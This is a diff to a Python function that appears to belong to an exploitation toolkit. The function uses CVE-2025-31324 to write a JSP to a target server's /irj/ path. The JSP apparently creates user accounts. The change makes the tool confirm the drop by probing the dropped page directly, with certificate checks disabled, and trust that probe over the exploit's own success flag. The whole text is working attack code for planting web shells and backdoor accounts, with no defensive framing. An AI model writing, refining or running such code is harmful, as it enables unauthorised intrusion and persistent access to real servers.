@@ -517,46 +517,57 @@ def deploy_create_user_jsp_via_cve_31324(node, writer_fn=None) -> dict:
     https = bool(getattr(node, "cve_2025_31324_https", False))
     jsp_name = _random_jsp_name("ume")
 
+    # The drop function classifies success by the "cause - getter
+    # getoutputproperties" exception trail.  Some servers (SJJ observed)
+    # suppress that trail and return HTTP 200 with an empty body even when
+    # the write succeeds — so we ignore the classifier's flag and probe the
+    # JSP URL directly as ground truth (mirrors drop_cve_2025_31324_shell's
+    # approach for the webshell drop).
     drop = exploit_cve_2025_31324_dropshell(
         host=host, port=port, use_https=https,
         shell_name=jsp_name, jsp_content=UME_CREATE_JSP, timeout=20.0)
-    if not drop.get("success"):
-        return {"success": False,
-                "error": (f"metadatauploader drop failed: "
-                          f"HTTP {drop.get('http_status')} — "
-                          f"{drop.get('evidence', '?')}"),
-                "http_status": drop.get("http_status", 0)}
 
     jsp_url = drop.get("shell_url") or \
               f"{'https' if https else 'http'}://{host}:{port}/irj/{jsp_name}"
 
-    # Post-drop reachability probe: the JSP compiles on first request, so a
-    # GET without args should return HTTP 200 with an empty body (our JSP
-    # prints nothing until ?action=…).  404 here means the drop landed in
-    # the wrong place — surface that immediately rather than failing later
-    # during the real invocation.
-    try:
-        ctx = ssl._create_unverified_context()
-        req = urllib.request.Request(jsp_url, headers={"User-Agent": _UA})
-        with urllib.request.urlopen(req, timeout=10, context=ctx) as r:
-            probe_status = r.status
-    except urllib.error.HTTPError as e:
-        probe_status = e.code
-    except (urllib.error.URLError, TimeoutError, OSError) as e:
-        return {"success": False,
-                "error": f"JSP deployed but unreachable: {e}",
-                "jsp_url": jsp_url}
-    if probe_status == 404:
-        return {"success": False,
-                "error": (f"JSP deployed but GET {jsp_url} returned 404 — "
-                          f"metadatauploader write did not land in the "
-                          f"served irj/root (possibly a non-default cluster "
-                          f"layout)"),
-                "jsp_url": jsp_url}
+    def _probe(url: str) -> int:
+        try:
+            ctx = ssl._create_unverified_context()
+            req = urllib.request.Request(url, headers={"User-Agent": _UA})
+            with urllib.request.urlopen(req, timeout=10, context=ctx) as r:
+                return r.status
+        except urllib.error.HTTPError as e:
+            return e.code
+        except (urllib.error.URLError, TimeoutError, OSError):
+            return 0
 
-    return {"success": True, "jsp_url": jsp_url, "jsp_name": jsp_name,
-            "target_path": "(metadatauploader-relative)",
-            "method": "cve_31324", "used_uid": drop.get("used_uid", "")}
+    probe_status = _probe(jsp_url)
+
+    if probe_status == 200:
+        return {"success": True, "jsp_url": jsp_url, "jsp_name": jsp_name,
+                "target_path": "(metadatauploader-relative)",
+                "method": "cve_31324",
+                "used_uid": drop.get("used_uid", "")}
+
+    # Probe failed — give whichever signal is most actionable.
+    if probe_status == 404:
+        error = (f"JSP deployed but GET {jsp_url} returned 404 — the "
+                 f"metadatauploader write did not land in the served "
+                 f"irj/root (possibly a non-default cluster layout)")
+    elif probe_status == 0:
+        error = f"JSP probe network error against {jsp_url}"
+    else:
+        error = f"JSP probe returned HTTP {probe_status} at {jsp_url}"
+
+    # If the drop itself was never classified as successful either, surface
+    # that context too — it helps distinguish "write rejected" from
+    # "write accepted but served-path mismatch".
+    if not drop.get("success"):
+        error += (f" · drop-phase: HTTP {drop.get('http_status')} "
+                  f"— {drop.get('evidence', '?')}")
+
+    return {"success": False, "error": error, "jsp_url": jsp_url,
+            "http_status": probe_status}
 
 
 # ---------------------------------------------------------------------------
